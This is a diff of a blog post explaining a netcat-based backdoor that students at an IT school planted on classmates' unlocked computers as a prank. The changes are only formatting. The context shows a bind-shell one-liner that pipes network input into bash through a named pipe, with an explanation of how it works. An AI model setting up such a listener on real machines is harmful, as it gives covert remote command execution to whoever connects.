@@ -19,9 +19,9 @@ A backdoor is a typically covert method of bypassing normal authentication to us
 
 ### Why!?
 
-I’ve always been interested in how things work. In my IT school, every time someone left his computer, he should have lock it. Why? Because an unlocked computer is the best way to be hacked. So, to make sure new students lock their computer, we usually “script” the unlocked computer to remind him next time to lock it.
+I’ve always been interested in how things work. In my IT school, every time someone left his computer, he should have lock it. Why? Because an unlocked computer is the best way to be hacked. So, to make sure new students lock their computer, we usually script[^script] the unlocked computer to remind him next time to lock it.
 
-(A “script” is usually a small bash code like alias ls=reboot to prank someone)
+[^script]: A script is usually a small bash code like `alias ls=reboot` to prank someone.
 
 In many cases, we (teaching assistants) don’t always have time to write an efficient script (an alias is sometimes not enough). To solve this, I’ve 2 solutions :
 
@@ -47,7 +47,7 @@ nc -l -p 8080 2> /dev/null < FIFO | bash > FIFO 2>&1
 
 Our backdoor is just a server that listens on port **8080** created by `nc -l -p 8080`. The server is hosted on the client-side (the target is the student in my case). This server takes a "bash command" (eg. `echo "test"` ) as request and answers the output of this one (eg. `test` ).
 
-1. We use [](https://en.wikipedia.org/wiki/Named_pipe)[unix pipeline](<https://en.wikipedia.org/wiki/Pipeline_(Unix)>) ("|") to redirect the "request payload" (the command sent by me) to the "bash" program.
+1. We use [unix pipeline](<https://en.wikipedia.org/wiki/Pipeline_(Unix)>) ("|") to redirect the "request payload" (the command sent by me) to the "bash" program.
 2. We use [named pipe](https://en.wikipedia.org/wiki/Named_pipe) ("FIFO") to redirect the output of "bash" program to the client response.
 
 #### Limitations :
